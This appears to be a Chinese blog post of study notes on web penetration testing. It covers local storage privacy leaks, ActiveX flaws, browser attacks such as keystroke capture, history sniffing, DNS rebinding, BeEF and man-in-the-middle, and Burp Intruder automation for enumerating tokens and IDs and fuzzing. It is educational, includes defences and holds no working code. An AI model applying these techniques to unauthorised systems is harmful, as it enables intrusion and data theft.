<li>如果表单的标签未设置 autocomplete=off，则用户输入的数据将被浏览器默认保存在本地（如果浏览器选项已经设置开启自动完成功能的话）；</li>
</ul>
<h3 id="Flash-本地共享对象"><a href="#Flash-本地共享对象" class="headerlink" title="Flash 本地共享对象"></a>Flash 本地共享对象</h3><p>Flash 有自己的存储机制，更有意思的是，它可以跨浏览器共享数据，只要它们都安装了相同的 Flask 插件即可；</p>
<p>渗透测试步骤</p>
<ul>
<li>有些现成的插件（如 BetterPrivacy）可浏览由用户应用程序创建的 Flash 本地共享对象；</li>
<li>不同的浏览器默认的存储位置不同，根据情况，可打开对应的文件夹，直接查看其中的原始 Flash 存储内容；</li>
</ul>
<h3 id="Silverlight-独立存储"><a href="#Silverlight-独立存储" class="headerlink" title="Silverlight 独立存储"></a>Silverlight 独立存储</h3><p>Silverlight 跟 Flash 一样，也有使用自己的独立存储</p>
<p>渗透测试步骤</p>
<ul>
<li>不同的浏览器默认的存储位置不同，根据情况，可打开对应的文件夹，直接查看其中的原始存储内容</li>
</ul>
<h3 id="IE-userData"><a href="#IE-userData" class="headerlink" title="IE userData"></a>IE userData</h3><p>IE 也有自己的本地存储机制，称为 userData，同样可以直接查看其中的原始存储内容，一般在以下路径</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210324083708.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="HTML5-本地存储"><a href="#HTML5-本地存储" class="headerlink" title="HTML5 本地存储"></a>HTML5 本地存储</h3><p>H5 引入了一些新的存储机制，包括</p>
<ul>
<li>会话存储</li>
<li>本地存储</li>
<li>数据库存储</li>
</ul>
<p>由于 H5 的规范还在完善中，因此其存储位置可能会动态变化，应根据浏览器支持的 H5 版本而定；</p>
<h3 id="防止本地隐私攻击"><a href="#防止本地隐私攻击" class="headerlink" title="防止本地隐私攻击"></a>防止本地隐私攻击</h3><ul>
<li>应避免将敏感数据存储在持久性 cookie 中</li>
<li>应用程序应使用合适的禁止缓存指令，避免浏览器敏感数据保存在本地；</li>
<li>杜绝使用 URL 参数传递敏感数据，而应使用 POST 方法；</li>
<li>在用户输入敏感数据的表单位置，应添加 autocomplete=off 属性，以避免自动完成功能记录用户输入的敏感数据；</li>
<li>如果需要在本地存储敏感数据，应该对这些数据进行加密，以防止攻击者直接访问；</li>
<li>告知用户存储风险，以便需要时，用户可以禁用该功能；</li>
</ul>
<h2 id="攻击-ActiveX-控件"><a href="#攻击-ActiveX-控件" class="headerlink" title="攻击 ActiveX 控件"></a>攻击 ActiveX 控件</h2><blockquote>
<p> ActiveX 是一个很有意思的技术理念，由于很多软件背后存在一些通用的功能，因此如果每个软件如果都需要就这些通用功能进行编写的话，显然是一种重复的工作，尤其是跨语言的情况（相同语言内部，可以使用导入第三方模块来解决）；为了让不同语言编写的功能，能够实现复用，微软发明了 ActiveX 技术，它本质上是一种接口规范，各应用程序将可供外部调用的功能，按该规范进行编写，则 Windows 操作系统上的其他程序，就可以对其进行调用，而无须打开源应用程序；</p>
<p> ActiveX 控件是专指 Active 理论在 IE 浏览器上的应用，IE 浏览器通过 ActiveX 控件，可以实现对本地其他应用程序功能的调用，例如本地视频播放器、Flash 播放器、Office 软件等，这样可以大大加强 IE 本身可以提供的功能，让 IE 可以直接处理原本它处理不了的文件，给用户提供更好的浏览体验；</p>
<p> 不同的应用程序在 IE 中有不同的 ActiveX 控件，用户可以根据需要进行安装；当安装了某个 ActiveX 控件后，该控件就会在浏览器中运行，当用户需要打开或播放某个该控件支持的文件时，该控件就会向操作系统调用本地应用程序，处理该文件，并将结果返回给 IE 浏览器；ActiveX 控件相当于充当了 IE 浏览器和本地应用程序之间的桥梁；</p>
<p> 开发者在 HTML 源代码中，指定某个 ActiveX 控件的调用，并传递相应的参数；IE 浏览器在解析 HTML 时，将根据控件 ID，调用该控件，并传递相应的参数，之后的工作将由 ActiveX 控件接手处理；</p>
<p> ActiveX 控件的优点在于其提供了强大的灵活性，因此能够带来很好的协同效果，但这是一把双刃剑，其功能越强大，意味着攻击者越有机会利用它来实现攻击目标，而绝大多数用户是缺少安全意识的，因此完全无法保护好自己；更糟糕的是， ActiveX 没有像 Java Applet 控件一样使用沙箱技术，一旦用户安装了某个 ActiveX 控件，该控件将成为了操作系统的一部分，具备很大的权限；</p>
<p> ActiveX 控件技术仅在 IE 浏览器中被支持，其他家的浏览器都不支持，安全起见，普通用户最好禁用该功能；</p>
</blockquote>
<h3 id="查找-ActiveX-漏洞"><a href="#查找-ActiveX-漏洞" class="headerlink" title="查找 ActiveX 漏洞"></a>查找 ActiveX 漏洞</h3><p>如果一个网站使用了 ActiveX 控件，则在其网页的源代码中，将出现调用或下载安装该控件的相关代码，示例如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210325074852.png" srcset="/img/loading.gif" lazyload></p>
<blockquote>
<p>classid 参数用来标识控件的全局 id；codebase 参数用来标识控件下载地址；</p>
</blockquote>
<p>在首次安装的时候，浏览器会弹出警告，要求用户确认控件的可信性；一旦用户点击确认后，该控件即被安装并标记为“脚本执行安全”；由于控件是全局的，这意味着，随后其它网站也可以调用该控件，调用方式如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210325075157.png" srcset="/img/loading.gif" lazyload></p>
<p>渗透测试步骤：</p>
<p>当发现网页上使用 ActiveX 控件时，一种探测该控件是否存在漏洞的方法为修改调用该控件的代码，替换提交给控件的参数，观察控件的执行结果；</p>
<ul>
<li>探查是否存在缓冲区溢出漏洞（详见第 16 章的描述）；</li>
<li>查看 ActiveX 的方法，是否为一些高风险的方法，例如 LaunchExe 等；</li>
</ul>
<blockquote>
<p>页面上的源代码常常并没有调用控件中的所有方法，因此，可以通过一些第三方工具，例如 COMRaider，枚举出控件的所有方法；</p>
</blockquote>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210325075737.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="防止-ActiveX-漏洞"><a href="#防止-ActiveX-漏洞" class="headerlink" title="防止 ActiveX 漏洞"></a>防止 ActiveX 漏洞</h3><p>ActiveX 控件本质上是一个编译软件，如果阻止这种类型的软件受到攻击，是一个很大很复杂的课题。主要有以下一些注意事项：</p>
<ul>
<li>发布控件前应进行审查，确保不存在缓冲区溢出之类的漏洞；</li>
<li>任何读取用户输入，并调用文件系统或操作系统的方法，都必须是私有方法，不得对外暴露；</li>
<li>可考虑增加域名确认，仅限特定域名列表中的域名，发起对控件的调用；</li>
<li>可考虑增加参数签名，对所有发给控件的参数，进行签名；如果签名无效，则拒绝调用；</li>
</ul>
<h2 id="攻击浏览器"><a href="#攻击浏览器" class="headerlink" title="攻击浏览器"></a>攻击浏览器</h2><p>同应用程序一样，浏览器本身也是一个应用程序，因此其也不可避免存在漏洞；攻击者如果能够发现并浏览器的漏洞，就可以攻破所有的网站，而不单单是存在漏洞的网站；</p>
<h3 id="记录键击"><a href="#记录键击" class="headerlink" title="记录键击"></a>记录键击</h3><p>当浏览器窗口获得焦点时，JS 脚本可以获取所有键盘输入，因此攻击者通过键击劫持，可以捕获用户输入的敏感数据；</p>
<p>一种攻击方法是攻击者在页面的 iframe 注入其设计的脚本，捕获用户的键盘输入，并将该输传递给顶层标签，同时在用户输入暂停时，暂时放弃激活状态，这样可以用户的输入仍然能够出现在顶层窗口中，并且光标也会处于闪烁的状态，实现在用户在毫无知觉的情况下，捕获其输入；</p>
<h3 id="窃取浏览器历史记录与搜索查询"><a href="#窃取浏览器历史记录与搜索查询" class="headerlink" title="窃取浏览器历史记录与搜索查询"></a>窃取浏览器历史记录与搜索查询</h3><p>这个很有意思，攻击者通过 JS 代码，动态创建很多常用站点的链接，以及一些常用的搜索关键字，注入在网页中；如果用户最近访问过这些站点，或者执行过相关的查询，浏览器将根据最近的浏览记录，将相应的链接标记为已访问的颜色（与未访问过的链接颜色有所不同），之后，攻击者再使用 JS 代码中的 getComputedStype 函数，查询其创建的链接的颜色样式，即可获知哪些链接是用户最近访问过的；</p>
<h3 id="获知用户登录过的应用程序"><a href="#获知用户登录过的应用程序" class="headerlink" title="获知用户登录过的应用程序"></a>获知用户登录过的应用程序</h3><p>攻击者枚举其想攻击的应用程序，向这些应用程序的某个受保护页面（需登录才能访问的页面）发送请求；虽然攻击者并不能访问目标应用程序返回的响应内容，但是如果这些页面不能被访问，那么目标应用程序会发送错误消息，或者发送重定向地址，此时攻击者通过提前设计好的错误处理函数，即可获知其发送的请求的状态，进而知道哪些网站是用户登录过的；根据获得的已登录的清单，攻击再有针对性的设计跨站点请求伪造，提高攻击效率；</p>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>攻击者可以利用 JS 代码，先确定用户主机的 IP 地址，得到本地网络的 IP 范围，然后对任意 IP 地址和端口发送请求，以测试其连通性；虽然同源策略可以阻止 JS 代码读取请求的响应，但是 JS 能够检测到请求错误或者未收到请求。通过这种方式，攻击者即可知道本地有哪些主机及相应的端口是可供访问的，为下一步攻击做准备；</p>
<h3 id="攻击本地网络其他设备"><a href="#攻击本地网络其他设备" class="headerlink" title="攻击本地网络其他设备"></a>攻击本地网络其他设备</h3><p>当获知本地可访问的主机和端口后，攻击者接下来可以有针对性的做进一步探查。例如运行定制化的脚本和错误处理函数，尝试获取可访问主机上的某个常用内容；如果该内容存在，错误函数未被触发，说明该主机符合某种预设的类型；之后，再利用该类型设备的已知漏洞，对其进行攻击；例如尝试使用默认密码进行登录等；</p>
<blockquote>
<p>如果攻击者能够控制路由器，那么就可以通过设置 DNS 重新绑定，来避开同源策略的限制，从而能够实施跨站点脚本攻击，获取目标应用程序的响应内容；</p>
</blockquote>
<h3 id="利用非-HTTP-服务"><a href="#利用非-HTTP-服务" class="headerlink" title="利用非  HTTP 服务"></a>利用非  HTTP 服务</h3><p>同一台机器上，可能在不同的端口运行着一些非 HTTP 服务，可能是为了兼容性考虑，大多数非 HTTP 服务都接受意外的输入，有些服务甚至接受 HTTP 消息头，并对其进行处理；如果发生这种情况的话，攻击者就可以在消息主体中发送该非 HTTP 服务可识别的二进制内容（HTTP 协议可用来发送任意内容的消息主体）</p>
<p>如果该非 HTTP 服务本身存在已知的漏洞，则攻击者就可以加以利用；甚至，攻击者还可以利用该非 HTTP 服务为跳板，对运行同一服务器上的 Web 应用程序发起请求，进行攻击；</p>
<p>要实现这种攻击，需要满足如下一些条件：</p>
<ul>
<li>非 HTTP 服务使用的端口未被浏览器禁止；</li>
<li>非 HTTP 服务接收 HTTP 消息头；</li>
<li>非 HTTP 服务会在其响应中回显一部分请求内容；</li>
<li>浏览器接收不包含有效 HTTP 消息头的响应，并且将部分响应内容做为 HTML 处理（出于兼容性考虑，正常会处理）；</li>
<li>浏览器在处理 cookie 时，会忽略端口号（正常会忽略）；</li>
</ul>
<h3 id="利用浏览器漏洞"><a href="#利用浏览器漏洞" class="headerlink" title="利用浏览器漏洞"></a>利用浏览器漏洞</h3><p>如果用户安装的某个版本的浏览器或者浏览器扩展存在已知的漏洞，则攻击者就可以利用该漏洞，例如利用 Java Applet 扩展中的已知漏洞，与本地计算机或者其他非 HTTP 服务进行二进制通信；攻击者可以利用该通信渠道，对端口进行扫描，发现其他存在的服务，并进一步利用该服务存在的已知漏洞；</p>
<h3 id="DNS-重新绑定"><a href="#DNS-重新绑定" class="headerlink" title="DNS 重新绑定"></a>DNS 重新绑定</h3><p>这个有点意思，工作原理如下：</p>
<ul>
<li>攻击者在其控制的服务器上放置恶意脚本；</li>
<li>在 DNS 域名服务器上，攻击者将其域名解析配置到上一步包含恶意脚本的服务器，并将 TTL 时间配置很短，以避免其解析被缓存；</li>
<li>当受害者访问攻击的网站时，会自动下载恶意脚本到本地；</li>
<li>该恶意脚本会向攻击者的网站再发送一次请求，由于 TTL 存放时间很短，浏览器因此再次向 DNS 域名服务器提交解析请求；</li>
<li>此时攻击者将 DNS 域名解析配置修改为目标应用程序的 IP；</li>
<li>浏览器获得目标应用程序的 IP，但却误以为是攻击者控制的域名的 IP，并向其发出请求；</li>
<li>该请求将被目标应用程序接收并处理和返回响应；</li>
<li>浏览器收到响应后，误以为是攻击者的域返回的响应，因此恶意脚本可以读取该响应的内容，并发送给攻击者；</li>
</ul>
<h3 id="借助浏览器框架"><a href="#借助浏览器框架" class="headerlink" title="借助浏览器框架"></a>借助浏览器框架</h3><p>针对 XSS 漏洞的攻击，市面上已经有很多成熟的浏览器攻击框架，用来演示如何利用这种漏洞进行攻击；这意味着当攻击者发现漏洞后，可以直接利用这些现成的框架，发起攻击；这些框架会利用已知的 XSS 漏洞，注入 JS 恶意脚本，定期向攻击者控制的服务器发送其收集到的数据，并可以接收攻击者发送的指令；</p>
<p>这些框架提供以下常用的功能：</p>
<ul>
<li>记录用户的键击，并发送给攻击者；</li>
<li>劫持用户的会话；</li>
<li>“指纹”识别用户使用的浏览器（攻击者可针对性的利用该浏览器的已知漏洞）；</li>
<li>对用户私有网络中的其他主机进行进行端口扫描，并将结果发送给攻击者；</li>
<li>通过用户的浏览器发送恶意请求，向其他 Web 应用程序实施攻击；</li>
<li>蛮力攻击用户的浏览历史记录，并将结果发送给攻击者；</li>
</ul>
<blockquote>
<p>攻击框架 BeEF 的使用示例：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210326073933.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210326073959.png" srcset="/img/loading.gif" lazyload></p>
<p>另一款功能强大的框架是 XSS Shell，可注入任意的 JS 代码，即使用户已经跳转到应用程序的其他页面，它还会驻留在用户的浏览器中；</p>
</blockquote>
<h3 id="中间人攻击"><a href="#中间人攻击" class="headerlink" title="中间人攻击"></a>中间人攻击</h3><p>攻击者通过中途拦截并更改网络请求来实施攻击，例如在无线公共热点和共享办公网络的场景中；很多 Web 应用程序仅在部分包含敏感数据的页面使用 HTTPS 来加密传输，而不是所有的连接都是加密的，这就为中间人攻击者创造了机会，尤其是当非加密页面使用绝对 URL 来引用脚本文件的话；攻击者可以替换这些脚本文件，注入恶意代码，实现攻击目的；</p>
<p>由于同源策略的存在，虽然攻击者更改了引用脚本的 URL 地址，但是此时该页面是在 HTTP 下传输的，新脚本文件中的代码，并无法访问原程序通过 HTTPS 协议传输的内容；接下来攻击者需要修改某个 HTTP 响应，构建重定向，让浏览器将 HTTP 切换为 HTTPS 并加载同一页面（或者在其他响应中改写页面上的 URL，让用户在不知情的情况下，点击改写后中的 URL）；</p>
<blockquote>
<p>此处有疑问：为什么浏览器不是使用 HTTPS 响应返回的页面中的脚本，而不是使用原 HTTP 响应返回的页面中的脚本？待后续做实验进行验证</p>
</blockquote>
<p>即使应用程序不使用未加密的 HTTP 传输内容，攻击者仍然可以修改用户访问其他非加密域的请求，并返回重定向的响应，该响应将诱使用户的浏览器向目标应用程序发起 HTTP 请求，然后攻击者拦截该请求，并返回任意的内容（此时即使应用程序的服务端都不监听 80 端口也不起作用，因为请求根本就没有到达应用程序的服务器）；接下来攻击者可以使用以下攻击技巧来攻击应用程序的 HTTPS 传输：</p>
<ul>
<li>当拦截到用户浏览器向目标程序发出的非加密 HTTP 请求后，攻击者通过拦截并返回自定义的响应，修改用户的 cookie 值（不管用户之前是否已经通过 HTTPS 收到了 cookie 值，都会被修改）；如果该 cookie 被原程序的代码以不安全的方式进行处理，例如存在读取 cookie 的 XSS 漏洞，那么攻击者通过针对性的设计 cookie，就可以利用该漏洞，实现攻击目的；</li>
<li>有些浏览器扩展并不区分和隔离普通 HTTP 和加密 HTTPS 的响应内容，而是将它们视为同一来源，因此攻击者通过 HTTP 返回的脚本，就可以通过这些扩展来访问用户使用 HTTPS 访问的内容（借刀杀人）；</li>
</ul>
<blockquote>
<p>当在不安全的网络（例如公共网络 通过 HTTPS 访问敏感内容时，应将浏览器的代理选项设置为“对除 HTTPS 以外的所有协议，使用无效的本地端口”，这样可以一定程度的降低攻击风险；</p>
</blockquote>
<h2 id="小结-8"><a href="#小结-8" class="headerlink" title="小结"></a>小结</h2><p>严重的缺陷常常隐藏在大量无关紧要的客户端缺陷中，攻击者可以利用这类缺陷对应用程序实施攻击；</p>
<h1 id="14-定制攻击自动化"><a href="#14-定制攻击自动化" class="headerlink" title="14. 定制攻击自动化"></a>14. 定制攻击自动化</h1><h2 id="应用定制自动化攻击"><a href="#应用定制自动化攻击" class="headerlink" title="应用定制自动化攻击"></a>应用定制自动化攻击</h2><p>对攻击进行自动化，可以提高攻击的效率；攻击自动化有以下几个常用的场景：</p>
<ul>
<li>枚举标识符：大多数 Web 应用程序会使用某种标识符来标识资源；标识符的范围也意味着有效资源的数量，因此通过自动枚举标识符，并发送请求，即可快速知道资源的存在范围；</li>
<li>获取数据：通过自动化大量发送请求来爬取有用的数据；</li>
<li>漏洞模糊测试：自动化发送大量设计过的异常字符串，观察应用程序的响应，即可探查应用程序存在哪些潜在的攻击面，作为下一步详细探查的筛选工作；</li>
</ul>
<h2 id="枚举有效的标识符"><a href="#枚举有效的标识符" class="headerlink" title="枚举有效的标识符"></a>枚举有效的标识符</h2><p>一些常见的需要枚举有效标识符的情况：</p>
<ul>
<li>枚举用户名列表，发送大量请求，根据应用程序的响应判断哪些用户名是存在的；</li>
<li>枚举各种资源标识符，如文件ID，账号、雇员编号、日志记录等，根据应用程序的响应，判断存在哪些资源；</li>
<li>枚举令牌（如果生成的令牌存在规律的话），判断存在哪些有效的令牌；</li>
</ul>
<h3 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h3><p>先做前期的探查，包括以下两个动作（请求响应对）：</p>
<ul>
<li>请求的参数包含某个标识符；</li>
<li>当改变这个参数值，服务器的响应也相应发生变化；并能够根据变化的区分，判断标识符是否有效；</li>
</ul>
<h3 id="探测触点"><a href="#探测触点" class="headerlink" title="探测触点"></a>探测触点</h3><p>一些常见的响应出现变化的特征</p>
<h4 id="HTTP-状态码"><a href="#HTTP-状态码" class="headerlink" title="HTTP 状态码"></a>HTTP 状态码</h4><ul>
<li>200，请求成功</li>
<li>301或302，请求被重定向到另外一个地址；</li>
<li>401或403，请求未授权或被禁止</li>
<li>404，请求的资源不存在；</li>
<li>500，服务器处理请求的过程中发生错误；</li>
</ul>
<h4 id="响应长度"><a href="#响应长度" class="headerlink" title="响应长度"></a>响应长度</h4><p>通常应用程序会使用某个页面模板，并填充数据，生成最终的 HTML 页面；当请求错误时，模板的长度一般要小于正常的模板，因此，通过响应的长度，即可判断请求是否成功；</p>
<h4 id="响应主体"><a href="#响应主体" class="headerlink" title="响应主体"></a>响应主体</h4><p>请求成功和失败的响应主体正常有所区别，并可以通过某个关键字识别出来，因此可以通过在响应中搜索这个关键字符串，来判断请求是否成功；</p>
<h4 id="Location-消息头"><a href="#Location-消息头" class="headerlink" title="Location 消息头"></a>Location 消息头</h4><p>有些应用程序使用重定向处理资源请求，当成功时，重定向到资源页面；当失败时，重定向到失败页面；因此，通过 Location 消息头字段可以判断请求是否成功；</p>
<h4 id="Set-Cookie-消息头"><a href="#Set-Cookie-消息头" class="headerlink" title="Set-Cookie 消息头"></a>Set-Cookie 消息头</h4><p>当请求有效时，有些应用程序会在 cookie 消息头中进行标识；例如当用户提交的密码正确时，响应会携带 cookie；如果密码无效，则不会；</p>
<h4 id="时间延迟"><a href="#时间延迟" class="headerlink" title="时间延迟"></a>时间延迟</h4><p>当请求无效时，有可能客户端很多就会收到响应；如果请求有效时，有可能服务器接下来要做很多工作，例如进行大量的计算，因此，通过时间延迟的长短，即可判断所提交的请求是否有效；</p>
<h3 id="编写攻击脚本"><a href="#编写攻击脚本" class="headerlink" title="编写攻击脚本"></a>编写攻击脚本</h3><p>虽然可以使用命令行脚本来编写，但由于命令行的表达式能力天生比较弱鸡，正常还是使用一些高级语言比较好，例如 Python、Java、Javascript、C# 等；</p>
<h3 id="JAttack"><a href="#JAttack" class="headerlink" title="JAttack"></a>JAttack</h3><p>除了自己编写攻击脚本外，更好的方法是使用一些现成的开源工具，例如 JAttack；JAttack 是用 Java 编写的，它的基本概念是将攻击请求设计成一个类，并通过属性控制哪些字段要在攻击中修改，哪些不能修改，并附上修改的方法，这样就可以很灵活的发送各种预期请求；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210327085857.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210327091435.png" srcset="/img/loading.gif" lazyload></p>
<h2 id="获取有用的数据"><a href="#获取有用的数据" class="headerlink" title="获取有用的数据"></a>获取有用的数据</h2><p>定制并发送专门设计的请求，不但可以利用漏洞获取有用的数据，有时候，即使没有漏洞，仅仅通过枚举的方式，也可以获取到有用的数据，常见情况如下：</p>
<ul>
<li>应用程序允许用户查看自己的订单，只要在请求中枚举出有效的订单号，就可以查看到其他用户的订单；</li>
<li>通过回答预设问题来实现忘记密码的功能，通过枚举大量的用户名，就可以获取大量的预设问题，然后可从中找到容易猜测答案的问题；</li>
<li>应用程序的某个接口接受一个用户 id，然后就会展示用户的相关信息，包括权限情况等，因此攻击者通过枚举 ID 即可以发现哪些用户账号拥有管理员权限，即可缩小范围，做进一步的针对性攻击；</li>
</ul>
<h2 id="常见漏洞模糊测试"><a href="#常见漏洞模糊测试" class="headerlink" title="常见漏洞模糊测试"></a>常见漏洞模糊测试</h2><p>在探查漏洞的阶段，针对解析过程中已知的各种请求参数，针对性的替换为各种专门设计的攻击字符串，然后监控应用程序的响应，即可更加快速的发现应用程序中可能存在的各种漏洞，例如 SQL 注入、命令行注入、路径遍历、XSS 漏洞等；</p>
<blockquote>
<p>由于请求参数需要根据应用程序的具体情况进行设计，因此这种类型的定制自动化攻击，往往要比全自动化的工作更有效率；其根本原因在于攻击者可以站在开发者的角度进行换位思考，推测其背后的控制逻辑，这是多数全自动化工具做不到的；</p>
</blockquote>
<h2 id="整合全部功能"><a href="#整合全部功能" class="headerlink" title="整合全部功能"></a>整合全部功能</h2><blockquote>
<p>估计市面上应该有很多将攻击进行自动化的工具，例如本书作者开发的 Burp Intruder，利用这些成熟的工具，可以让攻击更加的快速和高效；</p>
</blockquote>
<p>以下是 Burp Intruder 的一些基本功能介绍</p>
<h3 id="选择替换位置"><a href="#选择替换位置" class="headerlink" title="选择替换位置"></a>选择替换位置</h3><p>在发起大量攻击请求时，基本的作法是在请求中特定位置插入有效荷载，并使用不同的值来替换它；这些插入的位置即可以是请求参数，也可以是请求头部或主体的任何位置；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210329081722.png" srcset="/img/loading.gif" lazyload></p>
<p> 使用方法：</p>
<ul>
<li>使用 add 按钮为替换位置添加标记，如上面的截图，在添加标记后，替换位置的前面会使用特殊符号标记起点和终点，并用红色显示整个位置；当发起请求后，这些位置将被有效的攻击荷载替换，如果没有替换，则使用原来的值；</li>
<li>使用 auto 按钮可以自动化标记所有可替换的位置，减少手工标记的工作量；</li>
</ul>
<blockquote>
<p>sniper 攻击（狙击）：一次针对一个标记位置，使用所有的有效荷载轮流替换它并发出请求；之后转到下一个位置，重复前面的动作；</p>
<p>非 sniper 攻击：一次请求同时替换多个位置；</p>
</blockquote>
<h3 id="设置替换值"><a href="#设置替换值" class="headerlink" title="设置替换值"></a>设置替换值</h3><p>有效荷载可以自己设计，同时也可以利用 Intruder 现成的内置设计，这样可以节省很多时间，其内置的有效荷载包括：</p>
<ul>
<li>内置现成的数据列表，并且该列表支持自定义的配置，如添加和修改等；</li>
<li>根据模式对荷载进行定制迭代，假设应用程序接受 ABC45D 形式，则迭代器就可以枚举出所有符合这个规则的值；</li>
<li>字符的大小写替换，例如 password 可替换为 p4ssword, passw0rd, Password, PASSWORD 等，可用于实施密码的蛮力攻击；</li>
<li>数字类型的遍历，例如可用于遍历文档 ID、会话令牌等场景；数字支持多种进制，整数、分数、顺序、递增递减、随机等；</li>
<li>日期：对日期类型的输入进行枚举；</li>
<li>支持 Unicode 编码，对恶意字符的进行编码，避开过滤；</li>
<li>支持对字符块输入进行缓冲区溢出漏洞的探查；</li>
<li>支持对特殊字符集生成各种排列组合；</li>
<li>支持字符打乱和位翻转，系统性的操纵参数值的各个部分，探查应用程序背后的处理逻辑；</li>
<li>支持定制化的预处理：当了解到应用程序的某种处理规则时，在提交请求前，可以先对枚举值进行预处理，以通过应用程序的检查，例如各种编码方案、散列操作、大小写修改等；</li>
</ul>
<blockquote>
<p>默认情况下，Intruder 会对请求中的字面量字符进行 URL 编码，不然该请求会由于不符合 HTTP 规则而失效；</p>
</blockquote>
<h3 id="设置响应分析"><a href="#设置响应分析" class="headerlink" title="设置响应分析"></a>设置响应分析</h3><p>在实施攻击前，需要先明确需要分析响应中的哪些属性，例如扫描错误消息以发现潜在漏洞、扫描特定字符串以便 XSS 注入漏洞等；除了使用特定字符串或者正则表达式来搜索匹配外，还可以设置从响应中提取有用的数据；</p>
<h3 id="攻击1：枚举标识符"><a href="#攻击1：枚举标识符" class="headerlink" title="攻击1：枚举标识符"></a>攻击1：枚举标识符</h3><p>假设应用程序支持匿名用户注册，则可以通过注册多个账号，连续多次登录，获取不同账号的令牌，了解令牌的生成规律；</p>
<p>当发现某种规律后，就可以根据该规律，大量生成一些潜在可能有效的令牌，然后找到能够验证令牌是否有效的请求响应对，大量发送请求，筛选出有效的令牌；</p>
<p>假设获取的多个令牌如下：</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210329091008.png" srcset="/img/loading.gif" lazyload></p>
<p>从中可发现主要是最后3位数在变化，因此，可以就最后3位进行枚举</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210329091051.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210329091249.png" srcset="/img/loading.gif" lazyload></p>
<p>请求一个需要登录后才访问的页面，如用户个人令牌页，如果令牌有效，正常会收到 200 响应；如果无效，正常会被重定向到登录页面；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210329091225.png" srcset="/img/loading.gif" lazyload></p>
<p>同时，虽然都是 200 的响应，但根据响应长度的不同，我们还可以猜测到某些令牌返回的响应页面不同，很有可能这些令牌背后是拥有更高级权限的用户，所以页面上显示有更多的菜单；可点击查看该响应中的 HTML 源代码进行确认；</p>
<blockquote>
<p>除了状态码外，返回的其他消息头字段如果存在异常，往往意味着里面包含有价值的信息，应该特别进行留意；</p>
</blockquote>
<h3 id="攻击2：获取信息"><a href="#攻击2：获取信息" class="headerlink" title="攻击2：获取信息"></a>攻击2：获取信息</h3><p>应用程序某些页面的请求可能使用 id 参数，此时可以以当前某个有效的 id 为起点，改变 id 的最后两位数，发起请求进行遍历，并配置 Intruder 中的匹配选项，提取指定位置的内容；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330072455.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330072530.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330072820.png" srcset="/img/loading.gif" lazyload></p>
<h3 id="攻击3：应用程序模糊测试"><a href="#攻击3：应用程序模糊测试" class="headerlink" title="攻击3：应用程序模糊测试"></a>攻击3：应用程序模糊测试</h3><p>对于每个 URL，position 选项卡的 auto 功能可以实现自动化的模糊测试，它的原理很简单，即使用常用的有效荷载，逐一替换每一个请求参数，然后收集好响应结果，为下一步分析和发现异常做做好准备工作；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330074650.png" srcset="/img/loading.gif" lazyload></p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330074732.png" srcset="/img/loading.gif" lazyload></p>
<p>对响应结果进行初步分析可以发现，应用程序可能容易受到 SQL 注入攻击，因为在请求参数中放入一个单引号后，应用程序返回的响应不同，因此接下来可针对该潜在漏洞，进一步分析其利用的可能性；</p>
<blockquote>
<p>当现某个潜在漏洞时，可将响应发送到 Repeater 工具，该工具用来针对某个潜在漏洞，修改参数的多种形式，多次重新提交请求，以探查应用程序的处理逻辑，以及避开过滤或者净化的办法；</p>
</blockquote>
<h2 id="实施自动化的限制"><a href="#实施自动化的限制" class="headerlink" title="实施自动化的限制"></a>实施自动化的限制</h2><p>应用程序很可能存在某种防御攻击者提交大量自动化请求的机制，常见的两类：</p>
<ul>
<li>会话终止：当应用程序发现存在异常请求时，就终止当前会话；或者在某个关键功能中使用反 CSRF 令牌之类的临时参数，或引入多阶段验证，在接收当前请求前，需要先完成一系列的其他请求；</li>
<li>CAPTCHA 控件：专门在注册用来防御机器人；</li>
</ul>
<h3 id="会话终止"><a href="#会话终止" class="headerlink" title="会话终止"></a>会话终止</h3><p> 针对应用程序终止会话的防御机制，Burp 通过引入下面一些组件来尽可能避开防御机制：</p>
<h4 id="cookie-库"><a href="#cookie-库" class="headerlink" title="cookie 库"></a>cookie 库</h4><p>虽然浏览器会维护一个 cookie 库，Burp 也会自己维护一个，用于相关的组件，同时方便随时根据需要进行更新和修改；</p>
<p><img src="https://lhwccw.oss-cn-shenzhen.aliyuncs.com/20210330080354.png" srcset="/img/loading.gif" lazyload></p>
<h4 id="请求宏"><a href="#请求宏" class="headerlink" title="请求宏"></a>请求宏</h4><p>将多个步骤集成为一个，这样可以在提交每一次的攻击荷载前，先通过宏让应用程序进入接受请求的状态，例如检查当前登录状态、若无效则执行登录获取新会话、获取令牌等工作；</p>
<p>可以使用浏览器来录制宏，并做录制好的每一个步骤配置额外的动作，例如提取有用的信息，用于后续的动作，包括：</p>
<ul>
